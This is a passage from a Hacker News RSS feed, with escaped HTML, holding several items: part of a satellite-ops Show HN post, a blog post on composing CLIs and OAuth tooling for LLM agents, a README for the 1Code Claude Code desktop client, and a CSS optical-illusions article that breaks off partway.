expose everything via API - telemetry ingestion, predictions, topology snapshots, even an LLM chat endpoint for natural language troubleshooting.&lt;/p&gt;&lt;p&gt;The hard parts we're still working on: prediction accuracy degrades for longer time horizons (beyond 5 minutes gets dicey), we need more labeled failure data for rare edge cases, and the federated learning setup requires careful orchestration across different operators' security boundaries. We'd love feedback from anyone who's worked on satellite ops, RF link modeling, or time-series prediction at scale. What are we missing? What would make this actually useful in a production NOC environment?&lt;/p&gt;&lt;p&gt;Happy to answer any technical questions!&lt;/p&gt;&lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46721933</guid><pubDate>Thu, 22 Jan 2026 17:03:21 +0000</pubDate></item><item><title>Composing APIs and CLIs in the LLM era</title><link>https://walters.app/blog/composing-apis-clis</link><description>&lt;doc fingerprint="b7e1c59035133bd8"&gt;
  &lt;main&gt;
    &lt;p&gt; Itâs early 2026. Industry practice is divided on how to structure tool descriptions within the context window of an LLM. One strategy is to provide top-level tools that perform fine grained actions (e.g. list pull requests in a GitHub repo). Another increasingly popular strategy is to eschew new tools per se and to simply inform the model of useful shell commands it may invoke. In both cases reusable skills can be defined that give the model tips on how to perform useful work with the tools; the main difference is whether the model emits a direct tool call or instead an &lt;code&gt;exec_bash&lt;/code&gt; call containing a
            reference to CLIs.
          &lt;/p&gt;
    &lt;p&gt;To me it is clear that the latter represents an innovation on the former. The best feature of the unix shell is command composition. Enabling the model to form pipelines of tool calls without re-prompting the model after each stage should present huge savings in token cost. The resulting pipelines can also be saved to scripts or be customized and interactively executed by human operators.&lt;/p&gt;
    &lt;p&gt;The command line is an interface compatible with humans and machines. If the model is adept at using it (itâs already text), why fall back to a machine-native protocol?&lt;/p&gt;
    &lt;p&gt;One good response is that MCP is an easy way to expose SaaS functionality to agents. In lieu of MCP, how can we achieve that? Iâll answer this question by providing two quite different examples from my recent work: giving an agent access to Google Docs and to Google Groups.&lt;/p&gt;
    &lt;head rend="h2"&gt;HTTP APIs&lt;/head&gt;
    &lt;p&gt;I wanted my agent to be able to list my cloud-based Google Docs, to read them as markdown, and to read and understand any attached comment threads.&lt;/p&gt;
    &lt;p&gt; Google provides a very nice API to fulfill all of this functionality (well, comments are harder). I did the obvious thing and spun up a Google Cloud project, pasted the API documentation into an LLM, and the result was a &lt;code&gt;gdrive&lt;/code&gt; CLI with subcommands to list files and to export
            a particular one.
          &lt;/p&gt;
    &lt;p&gt;That worked. But as in the title of this post, the best code is no code. This script seemed entirely like boilerplate which shouldnât have to exist. This would be true even if the script were to use an SDK rather than make HTTP calls directly. In reality, Googleâand many SaaS vendorsâalready define a program which can be used to call all of their APIs. Itâs their OpenAPI spec! The program just needs a sufficient interpreter.&lt;/p&gt;
    &lt;p&gt;I Googled around and was thrilled to discover Restish, a tool which nearly perfectly matches my philosophy. If OpenAPI specs are programs, Restish is their interpreter. Sample usage (cribbed from their docs):&lt;/p&gt;
    &lt;quote&gt;# Register a new API called `cool-api` $ restish api configure cool-api https://api.rest.sh/openapi.yaml # This will show you all available commands from the API description. $ restish cool-api --help # Call an API operation (`list-images`) $ restish -r cool-api -H 'Accept: application/json' list-images | jq '.[0].name' "Dragonfly macro"&lt;/quote&gt;
    &lt;p&gt;Restish even generates shell completions for the API endpoints (subcomands) and parameters (options/args)!&lt;/p&gt;
    &lt;p&gt;I have only two complaints:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Restish wants to handle API authorization for me (persisting e.g. OAuth tokens). I want it to just be an âinterpreter for OpenAPI programsâ. Iâll manage my own auth flows and inject my own tokens.&lt;/item&gt;
      &lt;item&gt;Executing commands against an api spec requires registering the spec with Restish ahead of time. See aboveâI want just an interpreter.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Both points imply that Iâll want a wrapper script around restish. The wrapper script will manage the second issue (it will create a temporary spec directory to satisfy Restish). The script will also perform my desired authorization flow and inject tokens into Restish ephemerally.&lt;/p&gt;
    &lt;head rend="h2"&gt;API Authorization&lt;/head&gt;
    &lt;p&gt;Looking back at the omnibus script that I generated initially, it contained an OAuth 2.0 client to hit Googleâs authorization flow, get tokens, and refresh them upon expiry. OAuth 2.0 is a standard. A particular set of parameters (Googleâs OAuth URL, client id, client secret, grant type, scopes) could be thought of as a valid program in the OAuth 2.0 client language. I, again, just needed an interpreter. I, again, found one.&lt;/p&gt;
    &lt;p&gt;oauth2c is a command-line client for OAuth 2.0-compliant authorization servers. You input the aforementioned program (i.e. URL, grant type, ...) and it begins the ensuing flow (usually by opening your browser) then prints the resulting tokens to stdout.&lt;/p&gt;
    &lt;p&gt; With this missing piece, what was previously a couple-hundred lines of dense Python is now an order-of-magnitude smaller shell script which performs the logical equivalent of &lt;code&gt;oauth2c "https://accounts.google.com/..." | restish google
              drive-files-list&lt;/code&gt;.
          &lt;/p&gt;
    &lt;p&gt;The final script can be found at bmwalters/gdrive-client. One more interesting trick in there is how fish completions are forwarded.&lt;/p&gt;
    &lt;head rend="h3"&gt;Detour: secure token storage for macOS CLI scripts&lt;/head&gt;
    &lt;p&gt;While Iâm dispensing pro-tips, I should also note that I found a pretty cool and under-documented way to securely store data (like a long-lived refresh token) from a macOS shell script.&lt;/p&gt;
    &lt;p&gt; Let me introduce the problem. The results of Googleâs OAuth flow are a short-lived access token (to hit APIs; valid for about an hour) and a long-lived refresh token (to mint new access tokens; valid for 6 months). I wasnât comfortable with leaving that refresh token exposed on my machine. Services like the AWS CLI do indeed store plaintext credentials in &lt;code&gt;~&lt;/code&gt;, but those tend
            to expire much more frequently than 6 months.
          &lt;/p&gt;
    &lt;p&gt;I knew I wanted to reach for the macOS Keychain, and in particular some security level that would require biometrics / passcode when reading the refresh token.&lt;/p&gt;
    &lt;p&gt; macOS ships a handy keychain CLI named &lt;code&gt;security&lt;/code&gt;. You
            can store secrets in Keychain with invocations like
            &lt;code&gt;security add-generic-password -s google-api -a my-account -w
              $REFRESH_TOKEN&lt;/code&gt;. But biometrics are not trivially supported, and web search
            advised me to create a small Swift wrapper. After doing so, I
            learned that any &lt;code&gt;kSecAttrAccessControl&lt;/code&gt; attribute that
            would lead to biometrics or device passcode would result in the
            binary requiring real signed entitlements through the Apple
            Developer Program. I was a bit stuck looking for a solution to what
            seemed to be a simple requirement.
          &lt;/p&gt;
    &lt;p&gt; I ran the &lt;code&gt;security&lt;/code&gt;
            man page
            through Claude Opus 4.5 and the model made a very interesting
            discovery.
          &lt;/p&gt;
    &lt;quote&gt;-T appPath Specify an application which may access this item (multiple -T options are allowed)&lt;/quote&gt;
    &lt;p&gt; It turns out that the keychain remembers which application stored the passwordâby default this is probably &lt;code&gt;security&lt;/code&gt; itself or perhaps my shell; I havenât
            checkedâand that application is permitted to read back the password
            without user-interactive authorization. Providing the
            &lt;code&gt;-T&lt;/code&gt; flag to &lt;code&gt;security&lt;/code&gt; when creating the
            password allows overriding said program entry, and crucially the
            empty string may be used to remove the default application
            entry.
          &lt;/p&gt;
    &lt;p&gt;In other words this code:&lt;/p&gt;
    &lt;quote&gt;security add-generic-password -T"" ...&lt;/quote&gt;
    &lt;p&gt; will prevent &lt;code&gt;security find-generic-password&lt;/code&gt; from simply
            returning the secret, even when invoked immediately after secret
            creation. In practice, attempts to read the secret will prompt me
            for my device passcode, which is definitely good enough for my use
            case.
          &lt;/p&gt;
    &lt;p&gt; Putting it all together, I had a CLI that, when invoked, would try to use the stored access token with Restish (no passcode prompt needed). If the access token was invalid, it would invoke &lt;code&gt;oauth2c&lt;/code&gt; to refresh the token and retry. This would
            prompt me for my devcie passcode. If that also failed, it would
            invoke the Authorization Code flow using &lt;code&gt;oauth2c&lt;/code&gt; which
            would seamlessly open my browser and retry the command on success.
          &lt;/p&gt;
    &lt;p&gt;All with only shell pipelines, no bespoke code. Vastly reduced surface area for future maintenance and for bugs to hide in.&lt;/p&gt;
    &lt;head rend="h2"&gt;Adversarial interoperability&lt;/head&gt;
    &lt;p&gt;Thatâs all-well-and-good for services which provide machine-readable API specs, but what about those which are less charitable?&lt;/p&gt;
    &lt;p&gt;Google Groups is one such case. I wanted to export the discussion history from pollenpub to serve as a Q&amp;amp;A knowledge base while developing this blog site. However my research turned up no such API from Google.&lt;/p&gt;
    &lt;p&gt;I love using LLMs to solve this class of problem. My workflow is as follows:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Open a fresh private browser (to capture any authorization flow, if needed).&lt;/item&gt;
      &lt;item&gt;Open Devtools &amp;gt; Network and filter to HTML, XHR, WS, Other.&lt;/item&gt;
      &lt;item&gt;Perform the actions that I would like to automate, i.e. load the Google Group site, navigate to the next page, and read a particular conversation.&lt;/item&gt;
      &lt;item&gt;Firefox Devtools &amp;gt; Network &amp;gt; right click &amp;gt; âSave All As HARâ.&lt;/item&gt;
      &lt;item&gt;Run the file through cloudflare/har-sanitizer&lt;/item&gt;
      &lt;item&gt;Prompt an LLM with: âin this directory there is a large HAR file captured while I did actions xyz; please create a Python client for this APIâ.&lt;/item&gt;
      &lt;item&gt; Edit the generated file to add a meaningful &lt;code&gt;User-Agent&lt;/code&gt;string with a backlink.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Iâve repeated this workflow about three times and I have near-term plans for a couple more.&lt;/p&gt;
    &lt;p&gt;Note that I havenât tried combining the above two workflows yet; I havenât asked the model to produce an OpenAPI spec + reverse-engineered OAuth parameters for any site yet, but thatâs a logical next step.&lt;/p&gt;
    &lt;head rend="h2"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;Thereâs a lot of power in composing CLIs. You get human interaction and current-generation-LLM interaction for the price of one. And with some creativity, itâs often possible for one individual to maintain CLIs in place of an MCP server that has been developed for a given service, or even to do so before the comparable MCP server has been written.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46722074</guid><pubDate>Thu, 22 Jan 2026 17:14:04 +0000</pubDate></item><item><title>Show HN: First Claude Code client for Ollama local models</title><link>https://github.com/21st-dev/1code</link><description>&lt;doc fingerprint="423d0c5e65bff342"&gt;
  &lt;main&gt;
    &lt;p&gt;Best UI for Claude Code with local and remote agent execution.&lt;/p&gt;
    &lt;p&gt;By 21st.dev team&lt;/p&gt;
    &lt;quote&gt;
      &lt;p&gt;Platforms: macOS, Linux, and Windows. Windows support improved thanks to community contributions from @jesus-mgtc and @evgyur.&lt;/p&gt;
    &lt;/quote&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Feature&lt;/cell&gt;
        &lt;cell role="head"&gt;1Code&lt;/cell&gt;
        &lt;cell role="head"&gt;Claude Code&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Visual UI&lt;/cell&gt;
        &lt;cell&gt;✅ Cursor-like desktop app&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Git Worktree Isolation&lt;/cell&gt;
        &lt;cell&gt;✅ Each chat runs in isolated worktree&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Background Execution&lt;/cell&gt;
        &lt;cell&gt;✅ Run multiple agents in parallel&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Built-in Git Client&lt;/cell&gt;
        &lt;cell&gt;✅ Visual staging, commits, branches&lt;/cell&gt;
        &lt;cell&gt;❌ CLI git commands only&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Integrated Terminal&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
        &lt;cell&gt;❌&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Plan Mode&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;MCP Support&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Memory (CLAUDE.md)&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Skills &amp;amp; Slash Commands&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Custom Subagents&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Subscription &amp;amp; API Key Support&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Custom Models &amp;amp; Providers (BYOK)&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Checkpointing&lt;/cell&gt;
        &lt;cell&gt;🚧 Beta&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;Tool Approve&lt;/cell&gt;
        &lt;cell&gt;📋 Backlog&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Hooks&lt;/cell&gt;
        &lt;cell&gt;❌&lt;/cell&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Run agents locally, in worktrees, in background — without touching main branch.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Git Worktree Isolation - Each chat session runs in its own isolated worktree&lt;/item&gt;
      &lt;item&gt;Background Execution - Run agents in background while you continue working&lt;/item&gt;
      &lt;item&gt;Local-first - All code stays on your machine, no cloud sync required&lt;/item&gt;
      &lt;item&gt;Branch Safety - Never accidentally commit to main branch&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Cursor-like UI for Claude Code with diff previews, built-in git client, and the ability to see changes before they land.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Diff Previews - See exactly what changes Claude is making in real-time&lt;/item&gt;
      &lt;item&gt;Built-in Git Client - Stage, commit, and manage branches without leaving the app&lt;/item&gt;
      &lt;item&gt;Change Tracking - Visual diffs and PR management&lt;/item&gt;
      &lt;item&gt;Real-time Tool Execution - See bash commands, file edits, and web searches as they happen&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Claude asks clarifying questions, builds structured plans, and shows clean markdown preview — all before execution.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Clarifying Questions - Claude asks what it needs to know before starting&lt;/item&gt;
      &lt;item&gt;Structured Plans - See step-by-step breakdown of what will happen&lt;/item&gt;
      &lt;item&gt;Clean Markdown Preview - Review plans in readable format&lt;/item&gt;
      &lt;item&gt;Review Before Execution - Approve or modify the plan before Claude acts&lt;/item&gt;
    &lt;/list&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Plan &amp;amp; Agent Modes - Read-only analysis or full code execution permissions&lt;/item&gt;
      &lt;item&gt;Project Management - Link local folders with automatic Git remote detection&lt;/item&gt;
      &lt;item&gt;Integrated Terminal - Full terminal access within the app&lt;/item&gt;
    &lt;/list&gt;
    &lt;code&gt;# Prerequisites: Bun, Python, Xcode Command Line Tools (macOS)
bun install
bun run claude:download  # Download Claude binary (required!)
bun run build
bun run package:mac  # or package:win, package:linux&lt;/code&gt;
    &lt;quote&gt;&lt;p&gt;Important: The&lt;/p&gt;&lt;code&gt;claude:download&lt;/code&gt;step downloads the Claude CLI binary which is required for the agent chat to work. If you skip this step, the app will build but agent functionality won't work.&lt;/quote&gt;
    &lt;p&gt;Get pre-built releases + background agents support by subscribing at 1code.dev.&lt;/p&gt;
    &lt;p&gt;Your subscription helps us maintain and improve 1Code.&lt;/p&gt;
    &lt;code&gt;bun install
bun run claude:download  # First time only
bun run dev&lt;/code&gt;
    &lt;p&gt;Join our Discord for support and discussions.&lt;/p&gt;
    &lt;p&gt;Apache License 2.0 - see LICENSE for details.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</description><guid isPermaLink="false">https://news.ycombinator.com/item?id=46722285</guid><pubDate>Thu, 22 Jan 2026 17:26:12 +0000</pubDate></item><item><title>CSS Optical Illusions</title><link>https://alvaromontoro.com/blog/68091/css-optical-illusions</link><description>&lt;doc fingerprint="860c29efdbe599e5"&gt;
  &lt;main&gt;
    &lt;p&gt;You can find a collection with all the optical illusions in this article (and more!) on CodePen. You can move your mouse over many of the demos below to reveal the effect or stop the animations.&lt;/p&gt;
    &lt;head rend="h2"&gt;1 - Poggendorff Illusions&lt;/head&gt;
    &lt;p&gt;The Poggendorff illusion is an optical illusion in which a diagonal line interrupted by a vertical bar appears misaligned, even when both segments are actually continuous.&lt;/p&gt;
    &lt;p&gt;A simple version of this effect can be seen in the following demo. I used the &lt;code&gt;::before&lt;/code&gt; and &lt;code&gt;::after&lt;/code&gt; pseudo-elements to create the diagonal line and the vertical bar, respectively.&lt;/p&gt;
    &lt;p&gt;The effect can also be seen in a more elaborate version with multiple diagonal lines and vertical bars:&lt;/p&gt;
    &lt;p&gt;This drawing can easily be achieved using two CSS gradients: one tilted at 70 degrees and another consisting of a series of vertical columns. I applied it to the &lt;code&gt;body&lt;/code&gt;, although I could have used &lt;code&gt;:root&lt;/code&gt; instead.&lt;/p&gt;
    &lt;p&gt;Another variation of this illusion is the Münsterberg Poggendorff Arch, in which the two sides of an arch appear misaligned and seem as though they will not meet at the top - but they do (mouse over to see it).&lt;/p&gt;
    &lt;head rend="h2"&gt;2 - Induced Gradients&lt;/head&gt;
    &lt;p&gt;The following illusions combine gradients and flat colors. Surprisingly, some of the gradients do not actually exist. They are simple gray bars that, when placed over a gradient, appear to have gradients themselves.&lt;/p&gt;
    &lt;p&gt;Take the following demo: all three bars (two vertical ones on the sides and one horizontal bar in the center) are the same shade of gray. The only real gradient is behind them, which tricks our brain into believing that the bars are different colors and even contain gradients.&lt;/p&gt;
    &lt;p&gt;Here is another variation of this effect. It looks like the central line has a repeating gradient of dark and light grays, but in reality it is a flat color. If you mouse over the demo, the bar will expand, making it clear that there is no gradient at all.&lt;/p&gt;
    &lt;head rend="h2"&gt;3 - Cornsweet Illusion&lt;/head&gt;
    &lt;p&gt;The next few optical illusions share a common idea: some colors are identical, but they do not look the same. This typically happens when regions of the same color or brightness are surrounded by areas with different contrast.&lt;/p&gt;
    &lt;p&gt;For example, in the following demo, the left and right ends are the same shade of gray. However, one looks lighter because it is closer to white, while the other looks darker because it is closer to black. Mouse over to reveal that they are, in fact, the same color.&lt;/p&gt;
    &lt;head rend="h2"&gt;4 - White's Illusion&lt;/head&gt;
    &lt;p&gt;Run the following demo. You will see two gray columns in a black-and-white grid. Both columns are the same shade of gray, but the one surrounded by black appears darker than the one surrounded by white.&lt;/p&gt;
    &lt;p&gt;I coded this demo using &lt;code&gt;mix-blend-mode&lt;/code&gt; so I could try something a bit different. That worked well, but it also made it harder to showcase the effect on hover. In hindsight, I should have planned that better.&lt;/p&gt;
    &lt;p&gt;This optical illusion also works with colors. For example, these two squares appear to be different shades of blue, but they are the same color. This time, you can mouse over to reveal the effect:&lt;/p&gt;
    &lt;head rend="h2"&gt;5 - Wertheimer-Koffka Ring&lt;/head&gt;
    &lt;p&gt;The ring in the following illustration has the same color all the way around. However, one side is placed over white and the other over black, which makes them look different. If you mouse over the demo, the red bar will disappear, making it more obvious that the ring is a single, uniform color.&lt;/p&gt;
    &lt;head rend="h2"&gt;6 - Adelson's Illusion&lt;/head&gt;
    &lt;p&gt;You have probably seen the illusion involving a checkerboard and an object casting a shadow, where two tiles - one seemingly light and one seemingly dark - turn out to be the same color.&lt;/p&gt;
    &lt;p&gt;This demo follows the same principle. You will see two tiles labeled A and B. Both have the same shade of gray, but most people cannot tell at first glance (or second, or even third).&lt;/p&gt;
    &lt;head rend="h2"&gt;7 - Asahi illusion of Brightness&lt;/head&gt;
    &lt;p&gt;The circle at the center of this flower-shaped element is the same white as the rest of the page, but it gives the impression of being brighter, as if it were emitting light.&lt;/p&gt;
    &lt;head rend="h2"&gt;8 - Color Spheres&lt;/head&gt;
    &lt;p&gt;This is one of my favorite illusions in the collection. The circles (or spheres) look red, blue, or green, but in reality they are all the same grayish color. Our brain "colorizes" them based on the lines that overlap the shapes. Don't believe it? Mouse over the illustration.&lt;/p&gt;
    &lt;head rend="h2"&gt;9 - Colors from Contour&lt;/head&gt;
    &lt;p&gt;In the following illustration, the lines inside the yellow section appear blue, while the lines inside the blue section appear red... but they are all black (or very dark gray). The white contour creates the illusion of color. Mouse over to remove the contour and the lines will clearly appear black.&lt;/p&gt;
    &lt;head rend="h2"&gt;10 - Curvature Blindness&lt;/head&gt;
    &lt;p&gt;One set of lines looks straighter (top) while the other looks more curved (bottom). In reality, both sets are equally wavy. The only difference is how they are colored: changing the color at the peaks makes the lines look straighter. Changing it at the inflection points makes them look more curved.&lt;/p&gt;
    &lt;p&gt;The CSS code for the wavy lines is adapted from a Temani Afif snippet on CSS-Tricks and his wavy shape generator.&lt;/p&gt;
    &lt;head rend="h2"&gt;11 - Cafe Wall&lt;/head&gt;
    &lt;p&gt;This is a classic optical illusion and an easy one to code in CSS. Three gradients are all that is needed to generate the effect in which the horizontal lines appear slanted, even though they are perfectly parallel.&lt;/p&gt;
    &lt;head rend="h2"&gt;12 - Penrose Triangle&lt;/head&gt;
    &lt;p&gt;This optical illusion depicts an impossible shape. Parts that should be in front appear in the back, top becomes right, and everything feels contradictory. I coded this one some time ago for the 2024 Divtober event.&lt;/p&gt;
    &lt;head rend="h2"&gt;13 - Ebbinghaus Illusion&lt;/head&gt;
    &lt;p&gt;Which orange circle is larger: the one on the right or the one on the left? It is a trick question: both are the same size. However, having smaller surrounding elements gives the impression that one is larger.&lt;/p&gt;
    &lt;p&gt;I also created an animated version of this illusion (see below), as well as another version using a square shape instead of a flower shape:&lt;/p&gt;
    &lt;head rend="h2"&gt;14 - Kanizsa Square&lt;/head&gt;
    &lt;p&gt;When people look at this illustration, they usually say they see a white square over black circles. However, the square is not actually there. The "Pac-Man" shapes create the illusion of a square and a sense of depth. Our brain fills in the missing information.&lt;/p&gt;
    &lt;head rend="h2"&gt;15 - Ehrenstein's Illusion&lt;/head&gt;
    &lt;p&gt;There are no circles or discs in this illustration, only vertical and horizontal lines forming crosses. Our visual system completes the shape and makes us perceive a disc that does not exist.&lt;/p&gt;
    &lt;head rend="h2"&gt;16 - Neon-Color-Spreading Illusion&lt;/head&gt;
    &lt;p&gt;This illustration shows concentric circles, some of which have a green-and-black pattern. Our brain perceives a central patterned circle and four concentric circles around it, beneath the green circle.&lt;/p&gt;
    &lt;p&gt;I cheated a little when creating this in CSS, as I actually used a green circle blended with the other backgrounds.&lt;/p&gt;
    &lt;head rend="h2"&gt;17 - Hering and Wundt Illusions&lt;/head&gt;
    &lt;p&gt;Perspective-based illusions are fascinating. Even when we know we are looking at a flat image, our brain insists on interpreting depth.&lt;/p&gt;
    &lt;p&gt;In the Hering illusion, the red lines appear to curve outward, even though they are straight.&lt;/p&gt;
    &lt;p&gt;The opposite effect is the Wundt illusion. When the lines expand from the sides toward the center, the red lines appear to curve inward (this effect is more subtle).&lt;/p&gt;
    &lt;head rend="h2"&gt;18 - Ponzo Illusion&lt;/head&gt;
    &lt;p&gt;Both yellow lines are the same length, but the top one looks longer due to perceived depth and perspective. I tried a different approach when coding this one by applying a three-dimensional rotation in CSS... so the perspective is technically real.&lt;/p&gt;
    &lt;head rend="h2"&gt;19 - T Illusion&lt;/head&gt;
    &lt;p&gt;This illusion is easy to code in CSS and easy to fall for. Both the vertical and horizontal lines are the same length, but the vertical line appears longer.&lt;/p&gt;
    &lt;head rend="h2"&gt;20 - Müller-Lyer Illusion&lt;/head&gt;
    &lt;p&gt;A classic illusion: the horizontal lines are the same length, but inward- or outward-pointing edges dramatically change how we perceive them. I could swear the top one is longer. But it is not.&lt;/p&gt;
    &lt;p&gt; From a coding perspective, each shape is a pseudo-element. I ensured the horizontal lines were identical by using the same gradients and only repositioning the edges in the &lt;code&gt;::before&lt;/code&gt; and &lt;code&gt;::after&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h2"&gt;21 - Tilted Table Illusion&lt;/head&gt;
    &lt;p&gt;It looks like the top rectangle is leaning to the left, but it is actually parallel to the one at the bottom. The trick lies in the direction of the diagonal lines used to "color" each rectangle.&lt;/p&gt;
    &lt;p&gt;This illusion works better on larger screens. The effect is diminished when you can see the whole picture.&lt;/p&gt;
    &lt;head rend="h2"&gt;22 - Parallel Lines&lt;/head&gt;
    &lt;p&gt;This is a simple effect: the black lines are parallel, but they appear not to be because of the direction of the bars crossing them.&lt;/p&gt;
    &lt;p&gt;I slightly overcomplicated this one while coding it. I initially built the black-and-red version below and tried to reuse more code than I probably should have.&lt;/p&gt;
    &lt;p&gt;Here is the original version I created. The effect is also visible there:&lt;/p&gt;
    &lt;p&gt;Good news! There are more optical illusions below - but first, a warning.&lt;/p&gt;
    &lt;p&gt;ATTENTION: The following optical illusions are static, but they give the impression of movement. Proceed accordingly.&lt;/p&gt;
    &lt;p&gt;(Leaving some blank space in case you do not want to continue.)&lt;/p&gt;
    &lt;p&gt;.&lt;/p&gt;
    &lt;p&gt;.&lt;/p&gt;
    &lt;p&gt;.&lt;/p&gt;
    &lt;p&gt;.&lt;/p&gt;
    &lt;p&gt;.&lt;/p&gt;
    &lt;p&gt;.&lt;/p&gt;
    &lt;p&gt;.&lt;/p&gt;
    &lt;p&gt;.&lt;/p&gt;
    &lt;p&gt;.&lt;/p&gt;
    &lt;p&gt;.&lt;/p&gt;
    &lt;p&gt;.&lt;/p&gt;
    &lt;head rend="h2"&gt;23 - Expanding Hole&lt;/head&gt;
    &lt;p&gt;This is a trippy optical illusion. It is completely static, yet it looks like the black hole at the center is expanding - especially when you are not looking at it directly, creating the sensation of falling into a pit.&lt;/p&gt;
    &lt;p&gt;From a coding perspective, this one was very simple: a background pattern made with two radial gradients, plus a blurred pseudo-element for the "expanding" hole.&lt;/p&gt;
    &lt;head rend="h2"&gt;24 - Rotating Snakes&lt;/head&gt;
    &lt;p&gt;This is one of only two optical illusions in this collection where I used HTML elements instead of relying exclusively on CSS. It is a classic effect: when you look at the illustration, the peripheral discs appear to rotate, even though nothing is actually moving.&lt;/p&gt;
    &lt;head rend="h2"&gt;25 - Appearing Dots&lt;/head&gt;
    &lt;p&gt;Another classic illusion. Focus on the white dots and the adjacent dots will appear to turn black. There is no animation, no transition, and nothing dynamic. Just intersecting lines and small white circles, yet it looks like motion.&lt;/p&gt;
    &lt;head rend="h2"&gt;26 - Disappearing Dots&lt;/head&gt;
    &lt;p&gt;This pattern consists of repeating black and white dots across the page. If you focus on one dot, the others will begin to disappear. At first it may happen by row or column, but after a short while, most of them vanish.&lt;/p&gt;
    &lt;p&gt;If you do not immediately see the effect, try focusing on one black dot. Mouse over it, wait a few seconds while keeping your focus, and then mouse out.&lt;/p&gt;
    &lt;head rend="h2"&gt;27 - Ouchi Illusion&lt;/head&gt;
    &lt;p&gt;This is a static image, but it gives the impression that the pattern inside the circle is moving sideways. This happens because our eyes are constantly making small movements, even when we are not aware of it.&lt;/p&gt;
    &lt;p&gt;If you cannot see the illusion, try slightly moving the screen (or your head) while looking just outside the circle.&lt;/p&gt;
    &lt;head rend="h2"&gt;28 - Orthogonal Dotted Lines Sway&lt;/head&gt;
    &lt;p&gt;When you look around this pattern, the central area appears to slide and sway, even though it is completely static. This illusion makes me dizzy... but that may also be because I had to stare at it for a long time while coding it.&lt;/p&gt;
    &lt;head rend="h2"&gt;29 - Enigma&lt;/head&gt;
    &lt;p&gt;This illusion is particularly interesting. There is a pink circle surrounded by concentric pink and purple rings. If you focus on the pink circle, the rings appear to spin or scintillate, as if there were some activity in them. Of course, nothing is actually moving.&lt;/p&gt;
    &lt;head rend="h2"&gt;30 - Waves&lt;/head&gt;
    &lt;p&gt;This demo was challenging to code and takes a long time to load. Mainly because it uses a large number of conic gradients behind the scenes, which browsers struggle to render efficiently. There is probably a better way to implement it, but I have not explored that yet.&lt;/p&gt;
    &lt;p&gt;If you look closely at the illustration, you may notice wave-like motion. As with the previous illusions in this section, the image is entirely static.&lt;/p&gt;
    &lt;p&gt;Good news! There are more optical illusions below - but first, another warning.&lt;/p&gt;
    &lt;p&gt;ATTENTION: The following optical illusions actually move, and the illusion is created by motion itself. Some of them can be dizzying, so proceed accordingly.&lt;/p&gt;
    &lt;p&gt;(Leaving some blank space in case you do not want to continue.)&lt;/p&gt;
    &lt;p&gt;.&lt;/p&gt;
    &lt;p&gt;.&lt;/p&gt;
    &lt;p&gt;.&lt;/p&gt;
    &lt;p&gt;.&lt;/p&gt;
    &lt;p&gt;.&lt;/p&gt;
    &lt;p&gt;.&lt;/p&gt;
    &lt;p&gt;.&lt;/p&gt;
    &lt;p&gt;.&lt;/p&gt;
